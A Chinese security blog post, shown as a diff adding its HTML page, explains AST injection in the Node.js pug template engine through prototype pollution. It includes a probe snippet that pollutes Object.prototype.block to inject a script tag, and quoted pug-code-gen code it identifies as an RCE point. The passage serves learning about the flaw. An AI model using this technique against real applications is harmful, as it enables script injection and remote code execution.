@@ -1,0 +1,539 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>AST注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AST"><span class="toc-number">2.</span> <span class="toc-text">AST</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">词法分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">语法分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pug%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.1.</span> <span class="toc-text">pug模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-amp-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.1.2.</span> <span class="toc-text">原理&amp;原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>AST注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/2/10
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Nodejs/" style="color: #ff7d73">Nodejs</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904035271573511">https://juejin.cn/post/6844904035271573511</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367990285">https://zhuanlan.zhihu.com/p/367990285</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10218">https://xz.aliyun.com/t/10218</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12635">https://xz.aliyun.com/t/12635</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h1><p>抽象语法树 (Abstract Syntax Tree)，简称 AST，它是源代码语法结构的一种抽象表示。</p>
+<p>以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。</p>
+<p>运用：</p>
+<ul>
+<li>编辑器的错误提示、代码格式化、代码高亮、代码自动补全</li>
+<li><code>elint</code>、<code>pretiier</code> 对代码错误或风格的检查</li>
+<li><code>webpack</code> 通过 <code>babel</code> 转译 <code>javascript</code> 语法</li>
+</ul>
+<p>要想了解 js 编译执行的原理，那么首先得了解 AST</p>
+<p>js 执行的第一步是读取 js 文件中的字符流，然后通过<strong>词法分析</strong>生成 <code>token</code>，之后再通过<strong>语法分析</strong> (Parser) 生成 AST，最后生成机器码执行。</p>
+<h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>也称之为扫描 (scanner)，简单来说就是调用<code>next()</code>方法，一个一个字母的来读取字符，然后与定义好的 JavaScript 关键字符做比较，生成对应的 token 。token 是一个不可分割的最小单元</p>
+<blockquote>
+<p>例：<code>var</code>，语义上不能再被分解，因此是一个 token</p>
+</blockquote>
+<p>词法分析器里，每个<strong>关键字</strong>是一个 token ，每个<strong>标识符</strong>是一个 token，每个<strong>操作符</strong>是一个 token，每个<strong>标点符号</strong>也都是一个 token</p>
+<p>除此之外，还会过滤掉源程序中的<strong>注释和空白字符</strong>（换行符、空格、制表符）等</p>
+<p>最终，整个代码将被分割进一个 tokens 列表（或者说一维数组）</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 源码</span>
+a <span class="token operator">+</span> b
+
+<span class="token comment">// Tokens</span>
+<span class="token punctuation">[</span>
+  <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">end</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">loc</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">end</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">loc</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token literal-property property">end</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token literal-property property">loc</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p>将词法分析出来的 token 转化成有语法含义的抽象语法树结构。同时，验证语法，语法如果有错的话，抛出语法错误。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token parameter">a</span> <span class="token operator">=></span> a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>用 Acorn 解析 AST 树的在线网站：<a target="_blank" rel="noopener" href="https://astexplorer.net/">https://astexplorer.net/</a></p>
+<p>参考文章里有现成的图就copy过来一手</p>
+<p><img src="/blog/2024/02/10/AST%E6%B3%A8%E5%85%A5/image-20240210212021408.png" alt="image-20240210212021408"></p>
+<p>大致意思就是 用类型 const 声明变量 fn 指向一个箭头函数表达式，它的参数是 a 函数体也是 a</p>
+<hr>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>Nodejs引擎模板中的 AST</p>
+<p><img src="/blog/2024/02/10/AST%E6%B3%A8%E5%85%A5/image-20240210212338665.png" alt="image-20240210212338665"></p>
+<p>如图，代码在词法分析生成 tokens 后要经过 Parser (解析器) 和 Compiler (编译器) 才能被执行</p>
+<p>而我们的注入点就在 Parser 这里，如果在解析 tokens 时输入了一些非预期的值，使其在语法分析时产生恶意的 AST ，从而在编译后插入到函数中，实现命令执行</p>
+<p><img src="/blog/2024/02/10/AST%E6%B3%A8%E5%85%A5/image-20240210213403986.png" alt="image-20240210213403986"></p>
+<hr>
+<h2 id="pug模板"><a href="#pug模板" class="headerlink" title="pug模板"></a>pug模板</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> source <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">h1= msg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> fn <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'It works'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// &lt;h1>It works&lt;/h1></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>pug.compile</code> 函数会将字符串转换为模板函数并传递对象以供调用</p>
+<p>探测是否为pug模板：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>block <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Text"</span><span class="token punctuation">,</span><span class="token string-property property">"val"</span><span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(origin)&lt;/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> source <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">h1= msg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token keyword">var</span> fn <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'It works'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &lt;h1>It works&lt;script>alert(origin)&lt;/script>&lt;/h1></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h3 id="原理-amp-原型链污染"><a href="#原理-amp-原型链污染" class="headerlink" title="原理&amp;原型链污染"></a>原理&amp;原型链污染</h3><p>pug 解析 <code>h1= msg</code> ，生成的语法树结构：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span>
+    <span class="token property">"nodes"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Tag"</span><span class="token punctuation">,</span>
+            <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"h1"</span><span class="token punctuation">,</span>
+            <span class="token property">"selfClosing"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>
+            <span class="token property">"block"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span>
+                <span class="token property">"nodes"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+                    <span class="token punctuation">&#123;</span>
+                        <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Code"</span><span class="token punctuation">,</span>
+                        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"msg"</span><span class="token punctuation">,</span>
+                        <span class="token property">"buffer"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>
+                        <span class="token property">"mustEscape"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>
+                        <span class="token property">"isInline"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>
+                        <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+                        <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">3</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">]</span><span class="token punctuation">,</span>
+                <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token property">"attrs"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+
+            <span class="token punctuation">]</span><span class="token punctuation">,</span>
+            <span class="token property">"attributeBlocks"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+
+            <span class="token punctuation">]</span><span class="token punctuation">,</span>
+            <span class="token property">"isInline"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>
+            <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+            <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">1</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">0</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>语法树生成后，会调用 <code>walkAst</code> 执行语法树的解析过程，依次对每个节点的类型进行判断，即如下代码：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">walkAST</span><span class="token punctuation">(</span><span class="token parameter">ast<span class="token punctuation">,</span> before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+    parents<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>ast<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ast<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">case</span> <span class="token string">'NamedBlock'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'Block'</span><span class="token operator">:</span>
+          ast<span class="token punctuation">.</span>nodes <span class="token operator">=</span> <span class="token function">walkAndMergeNodes</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>nodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'Case'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'Filter'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'Mixin'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'Tag'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'InterpolatedTag'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'When'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'Code'</span><span class="token operator">:</span>
+        <span class="token keyword">case</span> <span class="token string">'While'</span><span class="token operator">:</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>ast<span class="token punctuation">.</span>block<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 注意这里</span>
+            ast<span class="token punctuation">.</span>block <span class="token operator">=</span> <span class="token function">walkAST</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>block<span class="token punctuation">,</span> before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">&#125;</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'Text'</span><span class="token operator">:</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    parents<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而语法树的解析顺序是：</p>
+<ol>
+<li>Block</li>
+<li>Tag</li>
+<li>Block</li>
+<li>Code</li>
+<li>…?</li>
+</ol>
+<p>这里第4步解析 <code>node.Type</code>  为 <code>Code</code> 类型</p>
+<p>那么就会执行下面的代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">case</span> <span class="token string">'Code'</span><span class="token operator">:</span>
+<span class="token keyword">case</span> <span class="token string">'While'</span><span class="token operator">:</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ast<span class="token punctuation">.</span>block<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 注意这里</span>
+    ast<span class="token punctuation">.</span>block <span class="token operator">=</span> <span class="token function">walkAST</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>block<span class="token punctuation">,</span> before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>判断 <code>ast.block</code> 属性是否存在，此处的 <code>ast</code> 即当前ast语法树的节点</li>
+<li>如果存在，继续递归解析 block</li>
+</ol>
+<p>而前面也说过，pug模板编译一段代码，背后的操作实际上是生成语法树 + <code>new Function</code></p>
+<p><img src="/blog/2024/02/10/AST%E6%B3%A8%E5%85%A5/image-20240210220129780.png" alt="image-20240210220129780"></p>
+<p>因此如果能通过AST Injection插入节点，并使之成为代码，即可达到远程代码执行的目的</p>
+<p>pug中有如下代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// /node_modules/pug-code-gen/index.js</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>debug <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">.</span>type <span class="token operator">!==</span> <span class="token string">'Block'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>line<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">var</span> js <span class="token operator">=</span> <span class="token string">';pug_debug_line = '</span> <span class="token operator">+</span> node<span class="token punctuation">.</span>line<span class="token punctuation">;</span>  
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>  
+            js <span class="token operator">+=</span> <span class="token string">';pug_debug_filename = '</span> <span class="token operator">+</span> <span class="token function">stringify</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token keyword">this</span><span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>js <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>仔细一看这里的操作和 merge 是差不多的，也就是说存在原型链污染</p>
+<p>结合 <code>生成语法树 + new Function</code> 的模式，只要我们在 AST 注入的语句中加入<code>Object.prototype.block</code>，污染 line 的值就能实现RCE</p>
